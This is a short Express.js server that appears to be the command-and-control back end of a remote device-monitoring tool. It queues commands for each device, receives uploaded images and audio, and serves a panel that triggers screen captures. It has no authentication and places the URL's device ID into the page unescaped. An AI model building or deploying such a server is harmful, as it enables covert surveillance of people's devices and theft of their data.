const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.json());

let commands = {};
let receivedData = {};

// Handle commands
app.post('/command/:deviceId', (req, res) => {
    commands[req.params.deviceId] = req.body.command;
    res.sendStatus(200);
});

// Get commands
app.get('/command/:deviceId', (req, res) => {
    res.json({ command: commands[req.params.deviceId] || '' });
});

// Store data (images, audio, etc.)
app.post('/data/:deviceId', (req, res) => {
    receivedData[req.params.deviceId] = req.body.data;
    res.sendStatus(200);
});

// Web Control Panel
app.get('/panel/:deviceId', (req, res) => {
    res.send(`<h1>Device Control Panel</h1>
              <button onclick="fetch('/command/${req.params.deviceId}', 
              { method: 'POST', body: JSON.stringify({command: 'capture_screen'}) })">
              Take Screenshot</button>`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));